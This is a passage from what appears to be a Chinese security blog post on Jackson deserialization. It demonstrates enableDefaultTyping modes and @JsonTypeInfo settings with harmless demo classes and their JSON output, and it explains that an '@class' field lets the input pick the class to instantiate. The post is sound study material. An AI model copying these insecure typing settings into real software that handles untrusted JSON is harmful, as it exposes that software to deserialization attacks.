keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">Object</span> object<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">Sex</span> sex<span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>      <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> object <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> object<span class="token punctuation">,</span> sex <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> sex<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>序列化和反序列化：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OBJECT_AND_NON_CONCRETE_Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>sex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MySex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 设置OBJECT_AND_NON_CONCRETE  </span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token class-name">ObjectMapper<span class="token punctuation">.</span>DefaultTyping</span><span class="token punctuation">.</span><span class="token constant">OBJECT_AND_NON_CONCRETE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 或直接无参调用，输出一样  </span>        <span class="token comment">//mapper.enableDefaultTyping();  </span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：可以看到该 Interface 类被序列化和反序列化</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"age"</span><span class="token operator">:</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token property">"object"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"Hacker"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"sex"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"MySex"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"sex"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>Person.age=<span class="token number">6</span><span class="token punctuation">,</span> Person.name=0w0<span class="token punctuation">,</span> Hacker@42dafa95<span class="token punctuation">,</span> MySex@6500df86<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h4 id="NON-CONCRETE-AND-ARRAYS"><a href="#NON-CONCRETE-AND-ARRAYS" class="headerlink" title="NON_CONCRETE_AND_ARRAYS"></a>NON_CONCRETE_AND_ARRAYS</h4><blockquote><p>除了前面提到的特征外，还支持 Array 类型</p></blockquote><p>于是给 Object 以 Hacker 类型数组：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NON_CONCRETE_AND_ARRAYS_Test</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>          p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>          <span class="token class-name">Hacker</span><span class="token punctuation">[</span><span class="token punctuation">]</span> hackers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          hackers<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          hackers<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          p<span class="token punctuation">.</span>object <span class="token operator">=</span> hackers<span class="token punctuation">;</span>          p<span class="token punctuation">.</span>sex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MySex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 设置NON_CONCRETE_AND_ARRAYS  </span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token class-name">ObjectMapper<span class="token punctuation">.</span>DefaultTyping</span><span class="token punctuation">.</span><span class="token constant">NON_CONCRETE_AND_ARRAYS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Person</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span><span class="token string">"age"</span><span class="token operator">:</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">"name"</span><span class="token operator">:</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token string">"object"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"[LHacker;"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"sex"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"MySex"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">"sex"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token class-name">Person</span><span class="token punctuation">.</span>age<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token number">0</span>w0<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name">LHacker</span><span class="token punctuation">;</span><span class="token annotation punctuation">@5cb9f472</span><span class="token punctuation">,</span> <span class="token class-name">MySex</span><span class="token annotation punctuation">@cb644e</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>类名变成了 <code>&quot;[L&quot;+类名+&quot;;&quot;</code></p><hr><h4 id="NON-FINAL"><a href="#NON-FINAL" class="headerlink" title="NON_FINAL"></a>NON_FINAL</h4><blockquote><p>除了前面的所有特征外，包含即将被序列化的类里的全部、非 final 的属性，也就是相当于整个类、除 final 外的属性信息都需要被序列化和反序列化</p></blockquote><p>给 Person 加上 Hacker 属性</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">Object</span> object<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">Sex</span> sex<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">Hacker</span> hacker<span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>      <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s, %s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> object <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> object<span class="token punctuation">,</span> sex <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> sex<span class="token punctuation">,</span> hacker <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> hacker<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>序列化与反序列化：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NON_FINAL_Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>sex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MySex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>hacker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 设置NON_FINAL  </span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token class-name">ObjectMapper<span class="token punctuation">.</span>DefaultTyping</span><span class="token punctuation">.</span><span class="token constant">NON_FINAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span><span class="token string">"Person"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"age"</span><span class="token operator">:</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token property">"object"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"Hacker"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"sex"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"MySex"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"sex"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"hacker"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"Hacker"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span>Person.age=<span class="token number">6</span><span class="token punctuation">,</span> Person.name=0w0<span class="token punctuation">,</span> Hacker@42dafa95<span class="token punctuation">,</span> MySex@6500df86<span class="token punctuation">,</span> Hacker@402a079c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>成功对非 final 的 hacker 属性进行序列化和反序列化</p><hr><h3 id="JsonTypeInfo-注解"><a href="#JsonTypeInfo-注解" class="headerlink" title="@JsonTypeInfo 注解"></a>@JsonTypeInfo 注解</h3><p><code>@JsonTypeInfo</code> 注解是 Jackson 多态类型绑定的一种方式，支持下面5种类型的取值：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">NONE</span><span class="token punctuation">)</span>  <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">CLASS</span><span class="token punctuation">)</span>  <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">MINIMAL_CLASS</span><span class="token punctuation">)</span>  <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">NAME</span><span class="token punctuation">)</span>  <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">CUSTOM</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="JsonTypeInfo-Id-NONE"><a href="#JsonTypeInfo-Id-NONE" class="headerlink" title="JsonTypeInfo.Id.NONE"></a>JsonTypeInfo.Id.NONE</h4><p>默认设置</p><h4 id="JsonTypeInfo-Id-CLASS"><a href="#JsonTypeInfo-Id-CLASS" class="headerlink" title="JsonTypeInfo.Id.CLASS"></a>JsonTypeInfo.Id.CLASS</h4><p>起一个 User 类，把 Hacker 类移到 com.example 下，指定注解</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">JsonTypeInfo</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>    <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">NAME</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> object<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"com.example.User&#123;"</span> <span class="token operator">+</span>                <span class="token string">"username='"</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", password='"</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", object="</span> <span class="token operator">+</span> object <span class="token operator">+</span>                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后序列化和反序列化：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Hacker</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JsonTypeInfo_Id_NONE_Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">User</span> u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        u<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>        u<span class="token punctuation">.</span>password <span class="token operator">=</span> <span class="token string">"******"</span><span class="token punctuation">;</span>        u<span class="token punctuation">.</span>object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">User</span> u2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>u2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"******"</span><span class="token punctuation">,</span><span class="token property">"object"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@class"</span><span class="token operator">:</span><span class="token string">"com.example.Hacker"</span><span class="token punctuation">,</span><span class="token property">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>User<span class="token punctuation">&#123;</span>username='0w0'<span class="token punctuation">,</span> password='******'<span class="token punctuation">,</span> object=com.example.Hacker@25bbe1b6<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>相比 NONE 注解时，object 属性中多了 <code>&quot;@class&quot;:&quot;com.example.Hacker&quot;</code>，即含有具体的类的信息，同时反序列化出来了 object 属性 Hacker 类对象，即能够成功对指定类型进行序列化和反序列化</p><p>也就是说，在Jackson反序列化的时候如果使用了<code>JsonTypeInfo.Id.CLASS</code>修饰的话，可以通过 @class 的方式指定相关类，并进行相关调用</p><hr><h4 id="JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="JsonTypeInfo.Id.MINIMAL_CLASS"></a>JsonTypeInfo.Id.MINIMAL_CLASS</h4><p>修改注解值为<code>JsonTypeInfo.Id.MINIMAL_CLASS</code></p><p>输出：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"******"</span><span class="token punctuation">,</span><span class="token property">"object"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@c"</span><span class="token operator">:</span><span class="token string">"com.example.Hacker"</span><span class="token punctuation">,</span><span class="token property">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>User<span class="token punctuation">&#123;</span>username='0w0'<span class="token punctuation">,</span> password='******'<span class="token punctuation">,</span> object=com.example.Hacker@69ea3742<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>object属性中 <code>&quot;@c&quot;:&quot;com.example.Hacker&quot;</code>，即使用 @c 替代了 @class</p><p>官方描述中的意思是缩短了相关类名，实际效果和 JsonTypeInfo.Id.CLASS 类似</p><hr><h4 id="JsonTypeInfo-Id-NAME"><a href="#JsonTypeInfo-Id-NAME" class="headerlink" title="JsonTypeInfo.Id.NAME"></a>JsonTypeInfo.Id.NAME</h4><p>修改注解值为<code>JsonTypeInfo.Id.NAME</code></p><p>输出：</p><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241224172923965.png" 